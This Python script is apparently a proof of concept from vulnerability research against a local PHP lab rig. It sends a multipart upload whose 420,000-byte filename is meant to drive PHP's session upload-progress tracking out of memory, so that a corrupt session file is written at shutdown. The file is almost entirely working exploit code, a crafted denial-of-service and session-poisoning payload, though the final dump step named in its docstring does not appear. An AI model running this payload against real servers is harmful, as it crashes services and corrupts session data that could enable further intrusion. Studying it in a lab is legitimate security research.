#!/usr/bin/env python3
"""g3-p1.py - PRODUCER test: 618-fatal (OOM inside session encode via upload
progress), then dump the poisoned session file from the rig's sess dir to see
exactly what corrupt bytes the shutdown-flush wrote."""
import socket, time, sys, hashlib

HOST = ("127.0.0.1", 14061)
SID = sys.argv[1].encode() if len(sys.argv) > 1 else b"abcdef0123456789abcdef0123456789"
B = b"OOM6GLM3"

def part(name, body, filename=None, ctype=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    head = b"--" + B + b"\r\n" + d + b"\r\n"
    if ctype:
        head += b"Content-Type: " + ctype + b"\r\n"
    return head + b"\r\n" + body + b"\r\n"

# producer: session id + progress + a file part whose FILENAME is huge =>
# progress entry's files[0]["name"] = 420KB filename string => encode OOM
body = part(b"PHPSESSID", SID) + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc")
FNLEN = 420000
body += part(b"f", b"x" * 64, filename=b"N" * FNLEN, ctype=b"text/plain")
body += b"--" + B + b"--\r\n"

head = (f"POST /lab.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()

s = socket.create_connection(HOST, timeout=90)
s.sendall(head + body)
s.settimeout(90)
out = b""
try:
    while True:
        d = s.recv(65536)
        if not d: break
        out += d
except Exception as e:
    print("recv:", type(e).__name__)
print("== fatal response ==")
print(out.decode(errors="replace")[-500:])
